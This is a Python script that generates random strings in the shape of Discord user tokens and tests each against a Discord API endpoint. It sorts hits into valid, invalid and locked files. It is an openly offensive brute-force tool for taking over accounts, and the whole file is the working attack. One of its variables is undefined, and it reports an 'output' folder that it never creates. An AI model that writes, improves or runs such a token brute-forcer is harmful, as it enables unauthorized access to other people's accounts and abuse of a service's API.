import random
import colorama
import requests
import os
from threading import Thread
from colorama.ansi import Fore, Style
import ctypes

character_length = 59
characters = '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'
token = ''

amount_of_characters = len(characters)

amount_to_gen = int(input('how many tokens should I generate: '))


def gen_tokens():
    f = open('tokens_to_test.txt', 'w')
    global token
    for x in range(amount_to_gen):
        token = ''
        for y in range(character_length):
            token = token + random.choice(characters)
        token = list(token)
        token[24] = '.'
        token[31] = '.'
        token = "".join(token)
        f.write(token + '\n')

    f.close()

try:
    ctypes.windll.kernel32.SetConsoleTitleW(Title)

    os.system('color')
except:
    pass


class Log:
    def err(str):
        print(f'{Style.BRIGHT}[{Fore.LIGHTRED_EX} ERROR {Fore.RESET}]: {str}')

    def succ(str):
        print(f'{Style.BRIGHT}[{Fore.LIGHTGREEN_EX} SUCCESS {Fore.RESET}]: {str}')

    def print(str):
        print(f'{Style.BRIGHT}[{Fore.LIGHTBLUE_EX} CONSOLE {Fore.RESET}]: {str}')


class Check():
    def __init__(self, tokenss):
        self.tokenss = tokenss
        self.status = 0
        self.headers = {'Authorization': self.tokenss}

    def start(self):

        reqobj = requests.get('https://discordapp.com/api/v9/guild-events', headers=self.headers)
        self.status = reqobj.status_code

        if reqobj.status_code == 200:
            return 'valid'

        elif reqobj.status_code == 401:
            return 'invalid'

        elif reqobj.status_code == 403:
            return 'locked'


Log.print('Everything is setup. Program will now start checking Tokens')


def TokenTester():
    gen_tokens()
    valid = 0
    invalid = 0
    locked = 0
    total = 0

    with open('tokens_to_test.txt', 'r') as tokens:
        for tokenss in tokens.read().split('\n'):
            checkit = Check(tokenss).start()
            total += 1
            if checkit == 'valid':
                valid += 1

                with open('valid.txt', 'a') as f:
                    f.write(f'{tokenss}\n')

                Log.succ(f'Found a valid token. There are now {valid} tokens that are valid!')

            elif checkit == 'invalid':
                invalid += 1
                with open('invalid.txt', 'a') as f:
                    f.write(f'{tokenss}\n')

                Log.err(f'Found an invalid token. There are now {invalid} tokens that are invalid!')

            elif checkit == 'locked':
                locked += 1
                with open('locked.txt', 'a') as f:
                    f.write(f'{tokenss}\n')

                Log.err(f'Found a locked a token. There are now {locked} tokens that are locked')

    Log.print('All tokens have been checked, you may find your result in the "output" folder')
    Log.print(f'Valid Tokens: {valid} Invalid Tokens: {invalid} Locked Tokens: {locked} Total: {total}')
    input()


if __name__ == "__main__":
    TokenTester()



